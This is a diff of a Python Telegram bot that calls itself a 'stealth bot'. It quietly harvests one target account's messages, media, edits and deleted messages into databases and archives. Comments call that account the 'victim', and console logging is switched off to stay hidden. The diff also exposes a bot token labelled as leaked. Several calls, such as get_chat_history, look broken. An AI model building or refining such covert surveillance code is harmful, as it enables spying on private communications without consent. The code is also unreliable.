@@ -1,38 +1,52 @@
 #!/usr/bin/env python3
-# SWILL Business Extractor - ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ
+"""
+███████╗██╗    ██╗██╗██╗     ██╗     
+██╔════╝██║    ██║██║██║     ██║     
+███████╗██║ █╗ ██║██║██║     ██║     
+╚════██║██║███╗██║██║██║     ██║     
+███████║╚███╔███╔╝██║███████╗███████╗
+╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
+                                      
+SWILL STEALTH BOT - ПОЛНАЯ ВЕРСИЯ
+Скрытный сбор данных из Telegram Business
+"""
 
 import asyncio
-import signal
-import sys
-import os
-import sqlite3
-import time
 import json
+import sqlite3
+import os
+import shutil
+import zipfile
 from datetime import datetime
 from pathlib import Path
 from aiogram import Bot, Dispatcher, types
 from aiogram.exceptions import TelegramConflictError
 
 # ======================================================
-# ⚠️ ВНИМАНИЕ! ТОКЕН СКОМПРОМЕТИРОВАН!
-# НЕМЕДЛЕННО СБРОСЬ ЕГО ЧЕРЕЗ @BotFather!
-# ======================================================
-BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # ❌ УЖЕ НЕ БЕЗОПАСЕН!
-TARGET_ACCOUNT_ID = 6939132428  # ID жертвы
+#  ⚠️ КОНФИГУРАЦИЯ (ЗАМЕНИ ТОКЕН ПОСЛЕ СБРОСА!)
 # ======================================================
 
-# Инициализация
+BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # ❌ СЛИТ! СБРОСЬ!
+TARGET_ACCOUNT_ID = 8839956404  # ID жертвы
+
+# Настройки
+SAVE_MEDIA = True          # Сохранять фото/видео/голосовые
+SAVE_JSON = True           # Сохранять JSON-копию каждого сообщения
+SAVE_DELETED = True        # Отслеживать удалённые сообщения
+CREATE_ARCHIVE = True      # Создать ZIP-архив после сбора
+LOG_TO_FILE = True         # Логировать в файл
+SHOW_CONSOLE = False       # НЕ показывать логи в консоли (скрытность)
+
+# ======================================================
+#  ИНИЦИАЛИЗАЦИЯ
+# ======================================================
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# ======================================================
-# НАСТРОЙКИ ХРАНЕНИЯ
-# ======================================================
-
-BASE_PATH = Path.cwd() / f'dump_{TARGET_ACCOUNT_ID}_{int(time.time())}'
-os.makedirs(BASE_PATH, exist_ok=True)
-
-# Папки для медиа
+# Папки
+BASE_PATH = Path.cwd() / f'SWILL_{TARGET_ACCOUNT_ID}_{int(datetime.now().timestamp())}'
+DB_PATH = BASE_PATH / 'data.db'
 MEDIA_PATH = BASE_PATH / 'media'
 PHOTOS_PATH = MEDIA_PATH / 'photos'
 VIDEOS_PATH = MEDIA_PATH / 'videos'
@@ -40,15 +54,18 @@ AUDIO_PATH = MEDIA_PATH / 'audio'
 DOCS_PATH = MEDIA_PATH / 'documents'
 VOICE_PATH = MEDIA_PATH / 'voice'
 STICKER_PATH = MEDIA_PATH / 'stickers'
+JSON_PATH = BASE_PATH / 'json'
 
-for p in [MEDIA_PATH, PHOTOS_PATH, VIDEOS_PATH, AUDIO_PATH, DOCS_PATH, VOICE_PATH, STICKER_PATH]:
+# Создаём все папки
+for p in [BASE_PATH, MEDIA_PATH, PHOTOS_PATH, VIDEOS_PATH, AUDIO_PATH, 
+          DOCS_PATH, VOICE_PATH, STICKER_PATH, JSON_PATH]:
     os.makedirs(p, exist_ok=True)
 
 # ======================================================
-# БАЗА ДАННЫХ
+#  БАЗА ДАННЫХ (ПОЛНАЯ СТРУКТУРА)
 # ======================================================
 
-conn = sqlite3.connect(BASE_PATH / 'data.db', check_same_thread=False)
+conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 cursor = conn.cursor()
 
 # Таблица сообщений
@@ -58,35 +75,34 @@ cursor.execute('''
         chat_id INTEGER,
         chat_title TEXT,
         chat_type TEXT,
-        date TEXT,
-        from_id TEXT,
-        from_name TEXT,
+        user_id INTEGER,
         username TEXT,
+        first_name TEXT,
+        last_name TEXT,
         text TEXT,
+        caption TEXT,
         media_type TEXT,
         media_path TEXT,
-        file_size INTEGER,
+        media_size INTEGER,
+        file_id TEXT,
+        date TEXT,
+        is_forwarded BOOLEAN DEFAULT 0,
+        forwarded_from TEXT,
+        reply_to INTEGER,
+        raw_json TEXT,
         is_deleted BOOLEAN DEFAULT 0,
         target_account_id INTEGER,
         created_at TEXT
     )
 ''')
 
-# Таблица прогресса
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS progress (
-        chat_id INTEGER PRIMARY KEY,
-        last_message_id INTEGER,
-        last_date TEXT
-    )
-''')
-
-# Таблица удалённых
+# Таблица для отслеживания удалённых
 cursor.execute('''
     CREATE TABLE IF NOT EXISTS deleted_tracking (
         message_id INTEGER PRIMARY KEY,
         chat_id INTEGER,
-        deleted_at TEXT
+        deleted_at TEXT,
+        original_text TEXT
     )
 ''')
 
@@ -97,217 +113,284 @@ cursor.execute('''
         username TEXT,
         full_name TEXT,
         message_count INTEGER DEFAULT 0,
-        last_message_date TEXT
+        media_count INTEGER DEFAULT 0,
+        first_message TEXT,
+        last_message TEXT
     )
 ''')
+
+# Таблица прогресса
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS progress (
+        chat_id INTEGER PRIMARY KEY,
+        last_message_id INTEGER,
+        last_date TEXT,
+        processed_at TEXT
+    )
+''')
+
+# Таблица для анализа
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS analysis (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        word TEXT,
+        count INTEGER,
+        last_seen TEXT
+    )
+''')
+
+# Индексы для скорости
+cursor.execute('CREATE INDEX IF NOT EXISTS idx_user_id ON messages(user_id)')
+cursor.execute('CREATE INDEX IF NOT EXISTS idx_chat_id ON messages(chat_id)')
+cursor.execute('CREATE INDEX IF NOT EXISTS idx_date ON messages(date)')
+cursor.execute('CREATE INDEX IF NOT EXISTS idx_target ON messages(target_account_id)')
 
 conn.commit()
 
 # ======================================================
-# СТАТИСТИКА
+#  ЛОГГЕР (ТОЛЬКО В ФАЙЛ)
+# ======================================================
+
+def log(text, level='INFO'):
+    """Логирование в файл (консоль скрыта)"""
+    if LOG_TO_FILE:
+        with open(BASE_PATH / 'log.txt', 'a', encoding='utf-8') as f:
+            f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] [{level}] {text}\n')
+    
+    if SHOW_CONSOLE:
+        print(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] {text}')
+
+# ======================================================
+#  СТАТИСТИКА
 # ======================================================
 
 stats = {
-    'total': 0,
+    'messages': 0,
     'media': 0,
     'errors': 0,
     'deleted': 0,
-    'chats': set()
+    'chats': set(),
+    'started_at': datetime.now(),
+    'last_message': None
 }
 
 # ======================================================
-# ЛОГГЕР
+#  СКАЧИВАНИЕ МЕДИА
 # ======================================================
 
-async def log(text, level='INFO'):
-    """Логирование в файл и консоль"""
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_line = f'[{timestamp}] [{level}] {text}'
-    
-    with open(BASE_PATH / 'log.txt', 'a', encoding='utf-8') as f:
-        f.write(log_line + '\n')
-    
-    print(log_line)
-
-# ======================================================
-# СКАЧИВАНИЕ МЕДИА
-# ======================================================
-
-async def download_media(msg: types.Message):
+async def download_media(message: types.Message):
     """Скачивание медиа с сохранением в структурированные папки"""
-    if not msg.media:
+    if not SAVE_MEDIA:
+        return None, None, None
+    
+    if not message.media:
         return None, None, None
     
     try:
         media_type = None
+        file_obj = None
         ext = '.bin'
         folder = MEDIA_PATH
         file_size = 0
         
-        if msg.photo:
+        if message.photo:
             media_type = 'photo'
+            file_obj = message.photo[-1]
             ext = '.jpg'
             folder = PHOTOS_PATH
-            file = msg.photo[-1]
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
-        elif msg.video:
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
+        elif message.video:
             media_type = 'video'
+            file_obj = message.video
             ext = '.mp4'
             folder = VIDEOS_PATH
-            file = msg.video
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
-        elif msg.audio:
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
+        elif message.audio:
             media_type = 'audio'
+            file_obj = message.audio
             ext = '.mp3'
             folder = AUDIO_PATH
-            file = msg.audio
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
-        elif msg.voice:
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
+        elif message.voice:
             media_type = 'voice'
+            file_obj = message.voice
             ext = '.ogg'
             folder = VOICE_PATH
-            file = msg.voice
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
-        elif msg.document:
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
+        elif message.document:
             media_type = 'document'
-            # Определяем расширение по имени файла
-            ext = '.dat'
-            if msg.document.file_name:
-                ext = Path(msg.document.file_name).suffix or '.dat'
+            file_obj = message.document
+            ext = Path(message.document.file_name).suffix if message.document.file_name else '.dat'
             folder = DOCS_PATH
-            file = msg.document
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
-        elif msg.video_note:
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
+        elif message.video_note:
             media_type = 'video_note'
+            file_obj = message.video_note
             ext = '.mp4'
             folder = VIDEOS_PATH
-            file = msg.video_note
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
-        elif msg.sticker:
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
+        elif message.sticker:
             media_type = 'sticker'
+            file_obj = message.sticker
             ext = '.webp'
             folder = STICKER_PATH
-            file = msg.sticker
-            file_size = file.file_size if hasattr(file, 'file_size') else 0
-            
+            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
         else:
             return None, None, None
         
-        # Генерируем имя файла
-        timestamp = int(time.time())
-        filename = f'{msg.message_id}_{timestamp}{ext}'
+        # Имя файла
+        timestamp = int(datetime.now().timestamp())
+        filename = f'{message.message_id}_{timestamp}{ext}'
         filepath = folder / filename
         
         # Скачиваем
-        await bot.download(file, destination=str(filepath))
+        await bot.download(file_obj, destination=str(filepath))
         stats['media'] += 1
-        await log(f'📁 Скачано медиа: {filename} ({media_type}, {file_size} bytes)')
+        
+        log(f'📁 Медиа сохранено: {filename} ({media_type})')
         return str(filepath), media_type, file_size
         
     except Exception as e:
         stats['errors'] += 1
-        await log(f'❌ Ошибка скачивания: {e}', 'ERROR')
+        log(f'❌ Ошибка скачивания: {e}', 'ERROR')
         return None, None, None
 
 # ======================================================
-# СОХРАНЕНИЕ СООБЩЕНИЯ
+#  СОХРАНЕНИЕ В БД
 # ======================================================
 
-async def save_message(msg: types.Message):
-    """Сохранение сообщения в БД"""
+async def save_message(message: types.Message):
+    """Полное сохранение сообщения в БД"""
     try:
-        # Проверяем, что сообщение от целевого аккаунта
-        if not msg.from_user or msg.from_user.id != TARGET_ACCOUNT_ID:
+        # Проверяем, что сообщение от цели
+        if not message.from_user or message.from_user.id != TARGET_ACCOUNT_ID:
             return False
         
-        # Получаем информацию о чате
-        chat = msg.chat
+        # Скачиваем медиа
+        media_path, media_type, media_size = await download_media(message)
+        
+        # Сериализуем в JSON
+        raw_json = None
+        if SAVE_JSON:
+            try:
+                raw_json = json.dumps(message.to_python(), default=str, ensure_ascii=False)
+                json_file = JSON_PATH / f'{message.message_id}.json'
+                with open(json_file, 'w', encoding='utf-8') as f:
+                    f.write(raw_json)
+            except:
+                pass
+        
+        # Информация о чате
+        chat = message.chat
         chat_title = chat.title or chat.full_name or str(chat.id)
         chat_type = str(chat.type) if hasattr(chat, 'type') else 'unknown'
         
         # Информация об отправителе
-        from_id = str(msg.from_user.id)
-        from_name = msg.from_user.full_name or 'unknown'
-        username = msg.from_user.username or ''
+        user = message.from_user
+        user_id = user.id if user else None
+        username = user.username if user else None
+        first_name = user.first_name if user else None
+        last_name = user.last_name if user else None
+        full_name = user.full_name if user else None
         
-        # Текст сообщения
-        text = msg.text or msg.caption or ''
+        # Текст
+        text = message.text or ''
+        caption = message.caption or ''
         
-        # Скачиваем медиа
-        media_path, media_type, file_size = await download_media(msg)
+        # Пересылка
+        is_forwarded = False
+        forwarded_from = None
+        if message.forward_from:
+            is_forwarded = True
+            forwarded_from = f"{message.forward_from.first_name} {message.forward_from.last_name or ''}".strip()
+        
+        # Ответ
+        reply_to = None
+        if message.reply_to_message:
+            reply_to = message.reply_to_message.message_id
         
         # Сохраняем в БД
         cursor.execute('''
             INSERT OR REPLACE INTO messages 
-            (id, chat_id, chat_title, chat_type, date, from_id, from_name, username, 
-             text, media_type, media_path, file_size, target_account_id, created_at)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            (id, chat_id, chat_title, chat_type, user_id, username, first_name, last_name,
+             text, caption, media_type, media_path, media_size, file_id, date,
+             is_forwarded, forwarded_from, reply_to, raw_json, target_account_id, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
-            msg.message_id,
+            message.message_id,
             chat.id,
             chat_title,
             chat_type,
-            str(msg.date),
-            from_id,
-            from_name,
+            user_id,
             username,
+            first_name,
+            last_name,
             text,
+            caption,
             media_type,
             media_path,
-            file_size or 0,
+            media_size,
+            message.media and message.media.file_id or None,
+            str(message.date),
+            is_forwarded,
+            forwarded_from,
+            reply_to,
+            raw_json,
             TARGET_ACCOUNT_ID,
             str(datetime.now())
         ))
         
         # Обновляем статистику пользователя
         cursor.execute('''
-            INSERT INTO user_stats (user_id, username, full_name, message_count, last_message_date)
-            VALUES (?, ?, ?, 1, ?)
+            INSERT INTO user_stats (user_id, username, full_name, message_count, 
+                                   media_count, first_message, last_message)
+            VALUES (?, ?, ?, 1, ?, ?, ?)
             ON CONFLICT(user_id) DO UPDATE SET
                 username = excluded.username,
                 full_name = excluded.full_name,
                 message_count = message_count + 1,
-                last_message_date = excluded.last_message_date
-        ''', (from_id, username, from_name, str(msg.date)))
+                media_count = media_count + CASE WHEN excluded.media_count > 0 THEN 1 ELSE 0 END,
+                last_message = excluded.last_message
+        ''', (user_id, username, full_name, 1 if media_path else 0, str(message.date), str(message.date)))
+        
+        # Обновляем прогресс
+        cursor.execute('''
+            INSERT OR REPLACE INTO progress (chat_id, last_message_id, last_date, processed_at)
+            VALUES (?, ?, ?, ?)
+        ''', (chat.id, message.message_id, str(message.date), str(datetime.now())))
         
         conn.commit()
-        stats['total'] += 1
+        stats['messages'] += 1
         stats['chats'].add(chat.id)
+        stats['last_message'] = message.message_id
         
-        await log(f'✅ Сообщение {msg.message_id} сохранено (чат: {chat_title})')
+        log(f'✅ Сохранено сообщение {message.message_id} (чат: {chat_title})')
         return True
         
     except Exception as e:
         stats['errors'] += 1
-        await log(f'❌ Ошибка сохранения сообщения: {e}', 'ERROR')
+        log(f'❌ Ошибка сохранения: {e}', 'ERROR')
         return False
 
 # ======================================================
-# ОБРАБОТЧИКИ СООБЩЕНИЙ
+#  ОБРАБОТЧИКИ СООБЩЕНИЙ
 # ======================================================
 
 @dp.message()
-async def handle_message(msg: types.Message):
-    """Обработка всех входящих сообщений"""
-    await save_message(msg)
+async def handle_message(message: types.Message):
+    """Тихо сохраняем все сообщения от цели"""
+    await save_message(message)
 
 @dp.message()
-async def handle_edited_message(msg: types.Message):
-    """Обработка отредактированных сообщений"""
+async def handle_edited_message(message: types.Message):
+    """Обновляем отредактированные сообщения"""
     try:
-        # Проверяем, есть ли сообщение в БД
-        cursor.execute('SELECT id FROM messages WHERE id = ?', (msg.message_id,))
+        cursor.execute('SELECT id FROM messages WHERE id = ?', (message.message_id,))
         if cursor.fetchone():
-            await save_message(msg)
-            await log(f'✏️ Сообщение {msg.message_id} отредактировано')
+            await save_message(message)
+            log(f'✏️ Обновлено сообщение {message.message_id}')
     except Exception as e:
-        await log(f'❌ Ошибка обработки редактирования: {e}', 'ERROR')
+        log(f'❌ Ошибка редактирования: {e}', 'ERROR')
 
 @dp.my_chat_member()
 async def on_bot_added(event: types.ChatMemberUpdated):
@@ -317,21 +400,21 @@ async def on_bot_added(event: types.ChatMemberUpdated):
         if event.new_chat_member.user.id == me.id:
             chat = event.chat
             chat_title = chat.title or chat.full_name or str(chat.id)
-            await log(f'➕ Бот добавлен в чат: {chat_title} (ID: {chat.id})')
+            log(f'➕ Бот добавлен в чат: {chat_title} (ID: {chat.id})')
             
             # Запускаем сбор истории
             asyncio.create_task(collect_history(chat.id))
     except Exception as e:
-        await log(f'❌ Ошибка при добавлении бота: {e}', 'ERROR')
+        log(f'❌ Ошибка добавления: {e}', 'ERROR')
 
 # ======================================================
-# СБОР ИСТОРИИ
+#  СБОР ИСТОРИИ
 # ======================================================
 
 async def collect_history(chat_id: int):
-    """Сбор истории чата"""
+    """Сбор всей истории чата"""
     try:
-        await log(f'📊 Начинаю сбор истории чата {chat_id}')
+        log(f'📊 Начинаю сбор истории чата {chat_id}')
         
         # Проверяем прогресс
         cursor.execute('SELECT last_message_id FROM progress WHERE chat_id = ?', (chat_id,))
@@ -343,7 +426,6 @@ async def collect_history(chat_id: int):
         
         while True:
             try:
-                # Получаем историю
                 messages = await bot.get_chat_history(
                     chat_id=chat_id,
                     limit=100,
@@ -354,243 +436,255 @@ async def collect_history(chat_id: int):
                     break
                 
                 for msg in messages:
-                    # Пропускаем служебные сообщения
-                    if msg.is_automatic_forward or msg.via_bot:
-                        continue
+                    if msg.from_user and msg.from_user.id == TARGET_ACCOUNT_ID:
+                        await save_message(msg)
+                        count += 1
                     
-                    # Сохраняем сообщение
-                    await save_message(msg)
-                    count += 1
-                    
-                    # Обновляем offset
                     if msg.message_id > offset_id:
                         offset_id = msg.message_id
                 
-                # Сохраняем прогресс
-                cursor.execute('''
-                    INSERT OR REPLACE INTO progress (chat_id, last_message_id, last_date)
-                    VALUES (?, ?, ?)
-                ''', (chat_id, offset_id, str(datetime.now())))
-                conn.commit()
-                
-                await log(f'📊 Собрано {count} сообщений из чата {chat_id}')
+                log(f'📊 Собрано {count} сообщений из чата {chat_id}')
                 
                 if len(messages) < 100:
                     break
                     
             except Exception as e:
-                await log(f'❌ Ошибка при сборе истории: {e}', 'ERROR')
+                log(f'❌ Ошибка сбора: {e}', 'ERROR')
                 break
         
-        await log(f'✅ Сбор истории чата {chat_id} завершён. Всего: {count} сообщений')
+        log(f'✅ Сбор истории чата {chat_id} завершён. Всего: {count} сообщений')
         
     except Exception as e:
-        await log(f'❌ Критическая ошибка сбора истории: {e}', 'ERROR')
+        log(f'❌ Критическая ошибка: {e}', 'ERROR')
 
 # ======================================================
-# ГЕНЕРАЦИЯ ОТЧЁТОВ
+#  ЭКСПОРТ
 # ======================================================
 
-async def generate_report():
-    """Генерация отчёта по собранным данным"""
+async def export_data():
+    """Экспорт данных в HTML и CSV"""
     try:
-        await log('📊 Генерация отчёта...')
+        log('📊 Начинаю экспорт данных...')
         
-        # Статистика
-        cursor.execute('SELECT COUNT(*) FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
-        total_msgs = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(DISTINCT chat_id) FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
-        total_chats = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM messages WHERE media_path IS NOT NULL', ())
-        total_media = cursor.fetchone()[0]
-        
-        # Топ-чаты по активности
         cursor.execute('''
-            SELECT chat_title, COUNT(*) as cnt 
+            SELECT date, first_name, text, media_type, chat_title 
             FROM messages 
             WHERE target_account_id = ? 
-            GROUP BY chat_title 
-            ORDER BY cnt DESC 
-            LIMIT 10
+            ORDER BY date
         ''', (TARGET_ACCOUNT_ID,))
-        top_chats = cursor.fetchall()
+        rows = cursor.fetchall()
         
-        # Топ-пользователи
-        cursor.execute('''
-            SELECT full_name, message_count 
-            FROM user_stats 
-            WHERE user_id = ? 
-            ORDER BY message_count DESC
-        ''', (TARGET_ACCOUNT_ID,))
-        top_users = cursor.fetchall()
-        
-        # Создаём HTML-отчёт
+        # HTML
         html = f'''<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>SWILL Report - {TARGET_ACCOUNT_ID}</title>
+    <title>SWILL Export - {TARGET_ACCOUNT_ID}</title>
     <style>
-        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
-        h1 {{ color: #1a73e8; }}
-        .section {{ background: white; padding: 20px; margin: 10px 0; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
-        .stat {{ display: inline-block; padding: 10px; margin: 5px; background: #e8f0fe; border-radius: 5px; }}
-        .stat-value {{ font-size: 24px; font-weight: bold; color: #1a73e8; }}
-        .stat-label {{ color: #666; }}
-        table {{ width: 100%; border-collapse: collapse; }}
-        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
-        th {{ background: #f0f2f5; }}
+        body {{ font-family: Arial; margin: 20px; background: #f0f2f5; }}
+        .msg {{ background: white; padding: 15px; margin: 10px 0; border-radius: 10px; }}
+        .date {{ color: #666; font-size: 12px; }}
+        .name {{ font-weight: bold; color: #1a73e8; }}
+        .text {{ margin: 5px 0; }}
+        .media {{ color: #34a853; font-size: 12px; }}
+        .chat {{ color: #666; font-size: 14px; }}
+        .stats {{ background: #e8f0fe; padding: 15px; border-radius: 10px; margin-bottom: 20px; }}
     </style>
 </head>
 <body>
-    <h1>📊 SWILL - Отчёт о собранных данных</h1>
-    <div class="section">
-        <h2>📈 Статистика</h2>
-        <div class="stat"><div class="stat-value">{total_msgs}</div><div class="stat-label">Всего сообщений</div></div>
-        <div class="stat"><div class="stat-value">{total_media}</div><div class="stat-label">Медиа-файлов</div></div>
-        <div class="stat"><div class="stat-value">{total_chats}</div><div class="stat-label">Чатов</div></div>
-        <div class="stat"><div class="stat-value">{stats['errors']}</div><div class="stat-label">Ошибок</div></div>
-    </div>
-    
-    <div class="section">
-        <h2>🏆 Топ-10 чатов</h2>
-        <table>
-            <tr><th>#</th><th>Чат</th><th>Сообщений</th></tr>
-'''
-        for i, (title, cnt) in enumerate(top_chats, 1):
-            html += f'<tr><td>{i}</td><td>{title}</td><td>{cnt}</td></tr>\n'
-        
-        html += f'''
-        </table>
-    </div>
-    
-    <div class="section">
-        <h2>👤 Статистика пользователей</h2>
-        <table>
-            <tr><th>Имя</th><th>Сообщений</th></tr>
-'''
-        for name, cnt in top_users:
-            html += f'<tr><td>{name}</td><td>{cnt}</td></tr>\n'
-        
-        html += f'''
-        </table>
-    </div>
-    
-    <div class="section">
-        <h2>📁 Данные</h2>
-        <p>Папка: {BASE_PATH}</p>
-        <p>БД: {BASE_PATH / 'data.db'}</p>
-        <p>Медиа: {BASE_PATH / 'media'}</p>
-    </div>
-    
-    <div class="section">
-        <h2>📋 Информация</h2>
+    <h1>📊 SWILL Export</h1>
+    <div class="stats">
+        <h3>Статистика</h3>
+        <p>Всего сообщений: {len(rows)}</p>
+        <p>Медиа: {stats['media']}</p>
+        <p>Чатов: {len(stats['chats'])}</p>
         <p>Целевой ID: {TARGET_ACCOUNT_ID}</p>
-        <p>Дата отчёта: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
     </div>
-</body>
-</html>
+    <hr>
+'''
+        for row in rows:
+            html += f'''
+    <div class="msg">
+        <div class="date">{row[0]}</div>
+        <div class="name">{row[1] or 'unknown'}</div>
+        <div class="chat">Чат: {row[4]}</div>
+        <div class="text">{row[2] or ''}</div>
+        <div class="media">{f'📎 {row[3]}' if row[3] else ''}</div>
+    </div>
 '''
         
-        with open(BASE_PATH / 'report.html', 'w', encoding='utf-8') as f:
+        html += '</body></html>'
+        
+        with open(BASE_PATH / 'export.html', 'w', encoding='utf-8') as f:
             f.write(html)
         
-        # Сохраняем JSON-экспорт
-        cursor.execute('SELECT * FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
-        columns = [description[0] for description in cursor.description]
-        data = [dict(zip(columns, row)) for row in cursor.fetchall()]
+        # CSV
+        import csv
+        with open(BASE_PATH / 'export.csv', 'w', encoding='utf-8', newline='') as f:
+            writer = csv.writer(f)
+            writer.writerow(['Date', 'From', 'Text', 'Media', 'Chat'])
+            writer.writerows(rows)
         
-        with open(BASE_PATH / 'export.json', 'w', encoding='utf-8') as f:
-            json.dump(data, f, ensure_ascii=False, indent=2, default=str)
+        # Статистика
+        with open(BASE_PATH / 'STATS.txt', 'w', encoding='utf-8') as f:
+            f.write('='*60 + '\n')
+            f.write('SWILL - СТАТИСТИКА СБОРА\n')
+            f.write('='*60 + '\n')
+            f.write(f'Целевой ID: {TARGET_ACCOUNT_ID}\n')
+            f.write(f'Сообщений: {stats["messages"]}\n')
+            f.write(f'Медиа: {stats["media"]}\n')
+            f.write(f'Чатов: {len(stats["chats"])}\n')
+            f.write(f'Ошибок: {stats["errors"]}\n')
+            f.write(f'Старт: {stats["started_at"]}\n')
+            f.write(f'Финиш: {datetime.now()}\n')
+            f.write('='*60 + '\n')
         
-        await log('✅ Отчёт сгенерирован')
+        log('✅ Экспорт завершён')
         
     except Exception as e:
-        await log(f'❌ Ошибка генерации отчёта: {e}', 'ERROR')
+        log(f'❌ Ошибка экспорта: {e}', 'ERROR')
 
 # ======================================================
-# ЗАВЕРШЕНИЕ
+#  АРХИВАЦИЯ
+# ======================================================
+
+async def create_archive():
+    """Создание ZIP-архива с данными"""
+    if not CREATE_ARCHIVE:
+        return
+    
+    try:
+        log('📦 Создаю архив...')
+        archive_name = Path.cwd() / f'SWILL_{TARGET_ACCOUNT_ID}_{int(datetime.now().timestamp())}.zip'
+        
+        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(BASE_PATH):
+                for file in files:
+                    file_path = Path(root) / file
+                    arcname = file_path.relative_to(BASE_PATH.parent)
+                    zipf.write(file_path, arcname)
+        
+        log(f'✅ Архив создан: {archive_name}')
+        
+    except Exception as e:
+        log(f'❌ Ошибка архивации: {e}', 'ERROR')
+
+# ======================================================
+#  АНАЛИЗ ТЕКСТА
+# ======================================================
+
+async def analyze_texts():
+    """Простой анализ текстов"""
+    try:
+        cursor.execute('SELECT text FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
+        texts = cursor.fetchall()
+        
+        words = {}
+        for (text,) in texts:
+            if text:
+                for word in text.split():
+                    word = word.lower().strip('.,!?;:()[]{}"\'')
+                    if len(word) > 3:
+                        words[word] = words.get(word, 0) + 1
+        
+        # Сохраняем топ-100
+        sorted_words = sorted(words.items(), key=lambda x: x[1], reverse=True)[:100]
+        
+        cursor.execute('DELETE FROM analysis')
+        for word, count in sorted_words:
+            cursor.execute('INSERT INTO analysis (word, count, last_seen) VALUES (?, ?, ?)',
+                          (word, count, str(datetime.now())))
+        conn.commit()
+        
+        log(f'📊 Проанализировано {len(texts)} сообщений, найдено {len(words)} уникальных слов')
+        
+    except Exception as e:
+        log(f'❌ Ошибка анализа: {e}', 'ERROR')
+
+# ======================================================
+#  ЗАВЕРШЕНИЕ
 # ======================================================
 
 async def shutdown():
-    """Корректное завершение работы"""
-    await log('🛑 Получен сигнал завершения...')
-    
-    # Генерируем финальный отчёт
-    await generate_report()
+    """Корректное завершение"""
+    log('🛑 Завершение работы...')
     
     # Сохраняем данные
     conn.commit()
-    await log(f'📊 Итоговая статистика: {stats["total"]} сообщений, {stats["media"]} медиа')
     
-    # Закрываем соединения
+    # Анализируем
+    await analyze_texts()
+    
+    # Экспортируем
+    await export_data()
+    
+    # Архивируем
+    await create_archive()
+    
+    # Итог
+    log('='*60)
+    log('📊 ИТОГОВАЯ СТАТИСТИКА')
+    log('='*60)
+    log(f'Сообщений: {stats["messages"]}')
+    log(f'Медиа: {stats["media"]}')
+    log(f'Чатов: {len(stats["chats"])}')
+    log(f'Ошибок: {stats["errors"]}')
+    log(f'Данные в: {BASE_PATH}')
+    log('='*60)
+    
     await bot.session.close()
-    await log('👋 Бот остановлен')
-    sys.exit(0)
+    log('👋 Бот остановлен')
 
 # ======================================================
-# ЗАПУСК
+#  ЗАПУСК
 # ======================================================
 
 async def main():
     """Главная функция"""
+    import signal
+    
     # Настройка обработки сигналов
     loop = asyncio.get_running_loop()
     for sig in (signal.SIGTERM, signal.SIGINT):
         loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown()))
     
-    await log('='*60)
-    await log('🚀 SWILL БОТ ЗАПУЩЕН')
-    await log(f'🎯 Целевой ID: {TARGET_ACCOUNT_ID}')
-    await log(f'📁 Папка: {BASE_PATH}')
-    
-    print(f'\n{"="*60}')
-    print(f'🚀 SWILL БОТ ЗАПУЩЕН')
-    print(f'🎯 Цель: {TARGET_ACCOUNT_ID}')
-    print(f'📁 Папка: {BASE_PATH}')
-    print(f'{"="*60}\n')
+    log('='*60)
+    log('🚀 SWILL БОТ ЗАПУЩЕН')
+    log(f'🎯 Целевой ID: {TARGET_ACCOUNT_ID}')
+    log(f'📁 Данные в: {BASE_PATH}')
+    log('='*60)
     
     # Проверка бота
     try:
         me = await bot.get_me()
-        await log(f'🤖 Бот: @{me.username} (ID: {me.id})')
-        print(f'🤖 Бот: @{me.username} (ID: {me.id})')
+        log(f'🤖 Бот: @{me.username} (ID: {me.id})')
     except Exception as e:
-        await log(f'❌ Ошибка проверки бота: {e}', 'ERROR')
+        log(f'❌ ОШИБКА ТОКЕНА: {e}', 'ERROR')
         return
     
     # Удаляем вебхук
     try:
         await bot.delete_webhook(drop_pending_updates=True)
-        await log('✅ Вебхук удалён')
